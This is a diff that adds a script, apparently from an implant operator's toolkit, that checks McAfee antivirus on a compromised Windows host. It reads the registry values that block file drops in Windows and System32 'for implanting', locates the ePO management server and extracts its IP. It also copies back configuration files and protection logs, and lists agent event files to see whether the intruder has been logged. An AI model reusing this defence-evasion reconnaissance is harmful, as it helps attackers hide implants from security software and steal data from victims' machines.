@@ -1,0 +1,163 @@
+#-------------------------------------------------------------------------------
+# File: mcafee80.eps
+# Description: Checks the status of McAfee Framework Services and logging
+#
+# v0.1 2006-11-22 Initial creation
+# v0.2 2006-12-01 Added root drive discovery
+# v0.3 2007-08-22 Modified to be called by mcafeestatus to support 8.5 additions
+#-------------------------------------------------------------------------------
+
+#string $root = GetEnv("_SYSDIRROOT");
+string $system32 = GetEnv("SYSPATH");
+string $rootDrive = split(":",$system32);
+int $i = 0;
+bool $check;
+
+if( prompt "\rWould you like to pull McAfee's registry values?\rStrongly recommended on initial access.\r" )
+{
+	@echo off;
+	@record on;
+	`regquery -hive L -subkey "software\\network associates\\tvd\\shared components\\on access scanner\\behaviourblocking"`;
+	@record off;
+	@echo on;
+
+	$i = 0;
+	string $reg_value;
+	string $reg_value_data;
+	string $status;
+
+	$reg_value = GetCmdData("value");
+	$reg_value_data = GetCmdData("value_data");
+	
+	echo "Displaying registry settings we care about for implanting.\r";
+
+	while( $i < sizeof($reg_value) )
+	{
+		if ( $reg_value[$i] == "FileBlockEnabled_27" )
+		{
+			if( $reg_value_data[$i] == "00000000") { $status = "FALSE"; } else { $status = "TRUE"; }
+			echo "Prevent creation of new files in the Windows folder (.dll) = $status ($reg_value_data[$i])";
+		}
+		if ( $reg_value[$i] == "FileBlockEnabled_28" )
+		{
+			if( $reg_value_data[$i] == "00000000") { $status = "FALSE"; } else { $status = "TRUE"; }
+			echo "Prevent creation of new files in the Windows folder (.exe) = $status ($reg_value_data[$i])";
+		}
+		if ( $reg_value[$i] == "FileBlockEnabled_29" )
+		{
+			if( $reg_value_data[$i] == "00000000") { $status = "FALSE"; } else { $status = "TRUE"; }
+			echo "Prevent creation of new files in the System32 folder (.dll) = $status ($reg_value_data[$i])";
+		}
+		if ( $reg_value[$i] == "FileBlockEnabled_30" )
+		{
+			if( $reg_value_data[$i] == "00000000") { $status = "FALSE"; } else { $status = "TRUE"; }
+			echo "Prevent creation of new files in the System32 folder (.exe) = $status ($reg_value_data[$i])";
+		}
+
+		$i++;
+	}
+	echo "\rRegistry pull complete.\r";
+}
+
+
+echo "\rChecking to see if we are calling home to an ePO server...";
+string $sslist = "$rootDrive[0]:\\Documents and Settings\\All Users\\Application Data\\Network Associates\\Common Framework\\ServerSiteList.xml";
+string $smlist = "$rootDrive[0]:\\Documents and Settings\\All Users\\Application Data\\Network Associates\\Common Framework\\SiteMapList.xml";
+
+@echo off;
+@record on;
+bool $ssl = `getfileattribs -file "$sslist"`;
+bool $sml = `getfileattribs -file "$smlist"`;
+@record off;
+@echo on;
+
+if ($ssl && $sml)
+{
+	echo "\r***********\rServerSiteList.xml file exists\rLooks like we have an ePO server somewhere.\r***********\r";
+	if( prompt "Try to grep out the ePO Server IP?" ) { `grep -mask "$sslist" -pattern ServerIP`; }
+	if( prompt "Would you like to pull back the configuration file for inspection?" ) { `background copyget "$sslist"`; }
+   	pause;
+
+}else if ( $sml && ($ssl != true) ){
+	#Stand alone
+	echo "\rSiteMapList.xml = True\rServerSiteList.xml = False\rLooks like a stand alone install.\r";
+
+}else if( ($ssl != true) && ($sml != true) ){
+	#Wrong path?
+	echo "\r***************\rCannot Verify Status!\rMost likely cause is the files are not in the default location.\rI checked:\r";
+	echo "$sslist";
+	echo "$smlist \r***************\r";
+	if (prompt "The rest of these checks will probably fail. Should I stop?") { return false; }
+
+}else{
+	#Fresh agent install? Needs manual verification
+	echo "\r***********\rServerSiteList.xml file exists but SiteMapList.xml does not.\rLooks like we have an ePO server somewhere.\rThis may be a very recently installed box. PAY ATTENTION! NETWORK SECURITY MAY BE INCREASING!\r***********\r";
+
+	if( prompt "Try to grep out the ePO Server IP?" ) { `grep -mask "$sslist" -pattern ServerIP`; }
+	if( prompt "Would you like to pull back the configuration file for inspection?" ) { `background copyget "$sslist"`; }
+   	pause;
+}
+
+echo "\rCurrent target time for reference is:";
+
+@record on;
+`remotelocaltime`;
+@record off;
+
+
+#Any chance we are in the logs?
+string $aplog = "$rootDrive[0]:\\Documents and Settings\\All Users\\Application Data\\Network Associates\\VirusScan\\AccessProtectionLog.txt";
+string $bolog = "$rootDrive[0]:\\Documents and Settings\\All Users\\Application Data\\Network Associates\\VirusScan\\BufferOverflowProtectionLog.txt";
+
+@echo off;
+echo "\r+++++++++++++++++++\rChecking out AccessProtectionLog\r+++++++++++++++++++\r";
+@record on;
+$check = `getfileattribs -file "$aplog"`;
+@record off;
+@echo on;
+
+int $fsize;
+string $mDate;
+string $mTime;
+
+if ($check) 
+{
+	$fsize = GetCmdData("Size");
+	$mDate = GetCmdData("ModifiedDate");
+	$mTime = GetCmdData("ModifiedTime");
+
+	echo "AccessProtectionLog details:\rLast modified on $mDate at $mTime \rFile size of $fsize bytes.\r";
+	if($fsize == 3){ echo "It appears the file is empty"; }	
+	else { if( prompt "Would you like to copyget the file?" ) { `background copyget "$aplog"`; } }
+}else{
+	echo "Sorry, I cannot find AccessProtectionLog in the default location. I looked in:\r\"$aplog\"\r";
+}
+
+@echo off;
+echo "\r+++++++++++++++++++\rChecking out BufferOverflowProtectionLog\r+++++++++++++++++++\r";
+@record on;
+$check = `getfileattribs -file "$bolog"`;
+@record off;
+@echo on;
+
+if ($check)
+{
+	$fsize = GetCmdData("Size");
+	$mDate = GetCmdData("ModifiedDate");
+	$mTime = GetCmdData("ModifiedTime");
+
+	echo "BufferOverFlowProtectionLog details:\rLast modified on $mDate at $mTime \rFile size of $fsize bytes.\r";
+	if($fsize == 3){ echo "It appears the file is empty"; }
+	else { if( prompt "Would you like to copyget the file?" ) { `background copyget "$bolog"`; } }
+}else{
+	echo "Sorry, I cannot find BufferOverflowProtectionLog in the default location. I looked in:\r\"$bolog\"\r";
+}
+
+pause;
+
+echo "\r+++++++++++++++++++\rPreparing to list any .xml event files.\rIf you have been logged, you may see evidence of that here.\r+++++++++++++++++++\r";
+echo "This listing has the potential to be very large.\rYou can always background it if it gets out of hand.";
+pause;
+
+`dir "$rootDrive[0]:\\Documents and Settings\\All Users\\Application Data\\Network Associates\\Common Framework\\AgentEvents\\*"`;
+
